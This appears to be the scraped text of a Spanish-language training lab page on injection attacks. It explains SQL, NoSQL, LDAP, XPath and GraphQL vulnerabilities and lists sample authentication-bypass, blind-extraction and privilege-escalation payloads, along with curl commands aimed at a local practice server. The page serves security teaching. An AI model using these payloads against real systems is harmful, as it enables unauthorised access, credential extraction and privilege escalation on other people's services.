Inyección SQL

Manipulación de consultas SQL mediante entrada no sanitizada

⚠️
Vulnerabilidad: La consulta usa concatenación directa de strings en lugar de prepared statements, permitiendo alterar la lógica SQL.
Consulta SQL generada:

                    

                


                
                

                    
Payloads de ejemplo

                    

                        

                            
Bypass de autenticación

                            ' OR '1'='1' --
                            
Salta la autenticación completamente al hacer la condición siempre
                                verdadera.

                        

                        

                            
Login como admin

                            administrador' --
                            
Entra como administrador sin saber la contraseña (el -- comenta el
                                resto).

                        

                        

                            
Primer usuario

                            ' OR 1=1 --
                            
Devuelve el primer usuario de la tabla de usuarios.

                        

                        

                            
UNION SELECT

                            ' UNION SELECT 1, 'hacked', 'pass' --
                            
Inyecta un usuario ficticio usando UNION para combinar resultados.
                            

                        

                        

                            
Con LIMIT

                            ' OR '1'='1' LIMIT 1 --
                            
Obtiene solo el primer registro, evitando errores con múltiples
                                resultados.

                        

                        

                            
En campo contraseña

                            ' OR '1'='1
                            
Inyección en el campo de contraseña en vez de usuario.

Inyección NoSQL

                        
Manipulación de consultas MongoDB mediante operadores JSON

                    

                


                

                    

                        ⚠️
                        

                            Vulnerabilidad: El servidor acepta objetos JSON directamente en la consulta
                            MongoDB sin validar el tipo de dato, permitiendo operadores como $gt,
                            $ne, $regex.
                        

                    


                    

                        

                            
                            

                                
                                
                            

                        

                        

                            
                            

                                
                                
                            

                        

                        

                        
                    


                    

                        
Consulta MongoDB generada:

                        

                    

                


                

                    
Payloads de ejemplo

                    

                        

                            
$ne (not equal) bypass

                            usuario: {"$ne": ""}
contraseña: {"$ne": ""}
                            
Busca donde usuario y contraseña NO sean vacíos — devuelve el primer
                                documento.

                        

                        

                            
$gt (greater than) bypass

                            usuario: {"$gt": ""}
contraseña: {"$gt": ""}
                            
Encuentra documentos donde los campos sean mayores que una cadena
                                vacía.

                        

                        

                            
$regex wildcard

                            usuario: {"$regex": ".*"}
contraseña: {"$regex": ".*"}
                            
Usa expresión regular que coincide con cualquier cadena.

                        

                        

                            
Enumeración con $regex

                            usuario: admin
contraseña: {"$regex": "^p"}
                            
Descubre contraseñas carácter por carácter usando regex parciales.
                            

                        

                        

                            
$in — múltiples usuarios

                            usuario: {"$in": ["admin",...]}
contraseña: {"$ne": "x"}
                            
Intenta múltiples nombres de usuario en una sola consulta.

                        

                        

                            
$where con JavaScript

                            usuario: {"$where": "1==1"}
                            
Ejecuta código JS arbitrario en el servidor MongoDB (muy peligroso).
                            

                        

                    

                


                
                

                    
Comandos curl para ejecutar

                    

                        

                            Bypass con $ne
                            
                        

                        
curl -X POST http://localhost:3001/nosql-login \
  -H "Content-Type: application/json" \
  -d '{"usuario":{"$ne":""},"contrasena":{"$ne":""}}'

                    

                    

                        

                            Bypass con $gt
                            
                        

                        
curl -X POST http://localhost:3001/nosql-login \
  -H "Content-Type: application/json" \
  -d '{"usuario":{"$gt":""},"contrasena":{"$gt":""}}'

                    

                    

                        

                            Enumeración con $regex
                            
                        

                        
curl -X POST http://localhost:3001/nosql-login \
  -H "Content-Type: application/json" \
  -d '{"usuario":"admin","contrasena":{"$regex":"^p"}}'

Inyección LDAP

                        
Manipulación de filtros LDAP para acceder a directorios sin
                            autorización

                    

                


                

                    

                        ℹ️
                        

                            Vulnerabilidad: El filtro LDAP se construye concatenando la entrada del
                            usuario directamente:
                            (&(uid={usuario})(userPassword={contraseña})). La falta de sanitización permite
                            inyectar operadores LDAP.
                        

                    


                    

                        

                            
                            

                                
                                
                            

                        

                        

                            
                            

                                
                                
                            

                        

                        

                        
                    


                    

                        
Filtro LDAP generado:

                        

                    

                


                

                    
Payloads de ejemplo

                    

                        

                            
Wildcard básico

                            *
                            
El asterisco coincide con cualquier valor en LDAP → devuelve el
                                primer usuario.

                        

                        

                            
Bypass con OR lógico

                            admin)(|(uid=*
                            
Cierra el filtro original e inyecta un OR que coincide con todos los
                                usuarios.

                        

                        

                            
Doble inyección

                            *)(uid=*))(|(uid=*
                            
Inyección más agresiva que fuerza múltiples filtros verdaderos.

                        

                        

                            
Null LDAP filter

                            admin)(&))
                            
Inyecta un filtro AND vacío que se evalúa como TRUE en algunas
                                implementaciones.

                        

                        

                            
Extracción de passwords

                            admin)(|(password=*
                            
Intenta manipular el filtro para que devuelva la contraseña.

                        

                        

                            
Inyección en contraseña

                            *)(uid=admin
                            
Inyecta en el campo contraseña para forzar búsqueda por uid=admin.
                            

                        

                    

                


                

                    
Comandos curl para ejecutar

                    

                        

                            Wildcard bypass
                            
                        

                        
curl -X POST http://localhost:3001/ldap-login \
  -H "Content-Type: application/json" \
  -d '{"usuario":"*","contrasena":"*"}'

                    

                    

                        

                            OR injection bypass
                            
                        

                        
curl -X POST http://localhost:3001/ldap-login \
  -H "Content-Type: application/json" \
  -d '{"usuario":"admin)(|(uid=*","contrasena":"cualquiera"}'

Inyección XPath

                        
Manipulación de consultas XPath contra documentos XML

                    

                


                

                    

                        ℹ️
                        

                            Vulnerabilidad: La consulta XPath se construye por concatenación:
                            //user[username/text()='{usuario}' and password/text()='{contraseña}']. Se
                            pueden inyectar predicados XPath.
                        

                    


                    

                        

                            
                            

                                
                                
                            

                        

                        

                            
                            

                                
                                
                            

                        

                        

                        
                    


                    

                        
Consulta XPath generada:

                        

                    

                


                

                    
Payloads de ejemplo

                    

                        

                            
Bypass clásico OR

                            usuario: ' or '1'='1
contraseña: ' or '1'='1
                            
Hace que ambas condiciones sean verdaderas, devolviendo el primer
                                nodo.

                        

                        

                            
Triple condición OR

                            ' or 1=1 or ''='
                            
Inyecta múltiples OR para garantizar una condición verdadera.

                        

                        

                            
Login como admin

                            admin' or '1'='1
                            
Fuerza la búsqueda del usuario admin haciendo la condición de
                                contraseña irrelevante.

                        

                        

                            
Union XPath

                            '] | //user[username/text()='admin
                            
Usa el operador UNION de XPath (|) para inyectar una segunda
                                consulta.

                        

                        

                            
Blind XPath — longitud

                            ' or string-length(//user[1]/password/text())>0 or ''='
                            
Inyección ciega para determinar si existe contenido en el campo
                                password.

                        

                        

                            
Blind XPath — caracteres

                            ' or substring(...,1,1)='p' or ''='
                            
Extrae la contraseña carácter por carácter usando substring().

                        

                    

                


                

                    
Comandos curl para ejecutar

                    

                        

                            Bypass con OR
                            
            

            
curl -X POST http://localhost:3001/xpath-login \
                                -H "Content-Type: application/json" \
                                -d '{"usuario":"'"'"' or '"'"'1'"'"'='"'"'1","contrasena":"'"'"' or
                                '"'"'1'"'"'='"'"'1"}'

                        

                        

                            

                                Login como admin
                                
            

            
curl -X POST http://localhost:3001/xpath-login \
                                    -H "Content-Type: application/json" \
                                    -d '{"usuario":"admin'"'"' or '"'"'1'"'"'='"'"'1","contrasena":"x"}'

Inyección GraphQL

                        
Explotación de esquemas GraphQL con introspección y consultas
                            maliciosas

                    

                


                

                    

                        ⚠️
                        

                            Vulnerabilidad: El endpoint GraphQL tiene introspección habilitada, no
                            limita profundidad de queries, y no tiene rate limiting. Esto permite enumerar todo el
                            esquema y extraer datos.
                        

                    


                    

                        

                            
                            
                        

                        

                        
                    


                    

                        
Respuesta del servidor:

                        

                    

                


                

                    
Payloads de ejemplo

                    

                        

                            
Listar todos los usuarios

                            { users { id username password role } }
                            
Accede a todos los campos incluyendo contraseñas (sin control de
                                acceso).

                        

                        

                            
Introspección del esquema

                            { __schema { types { name fields { name } } } }
                            
Revela toda la estructura del API GraphQL: tipos, campos,
                                relaciones.

                        

                        

                            
Introspección tipo User

                            { __type(name: "User") { ... } }
                            
Enumera todos los campos del tipo User para descubrir campos
                                sensibles.

                        

                        

                            
Acceso a usuario específico

                            { user(id: 1) { username password role email } }
                            
Lee los datos de un usuario específico por ID, incluyendo datos
                                sensibles.

                        

                        

                            
Escalada de privilegios

                            mutation { updateRole(userId:1, role:"superadmin") }
                            
Mutation sin autorización para cambiar el rol de un usuario a
                                superadmin.

                        

                        

                            
Búsqueda con fragments

                            { search(query:"admin") { ...on User {...} } }
                            
Usa inline fragments para extraer datos de múltiples tipos en una
                                búsqueda.

                        

                    

                


                

                    
Comandos curl para ejecutar

                    

                        

                            Listar todos los usuarios
                            
                        

                        
curl -X POST http://localhost:3001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username password role } }"}'

                    

                    

                        

                            Introspección completa del esquema
                            
                        

                        
curl -X POST http://localhost:3001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

                    

                    

                        

                            Escalada de privilegios
                            
                        

                        
curl -X POST http://localhost:3001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateRole(userId:1, role:\"superadmin\") { id username role } }"}'
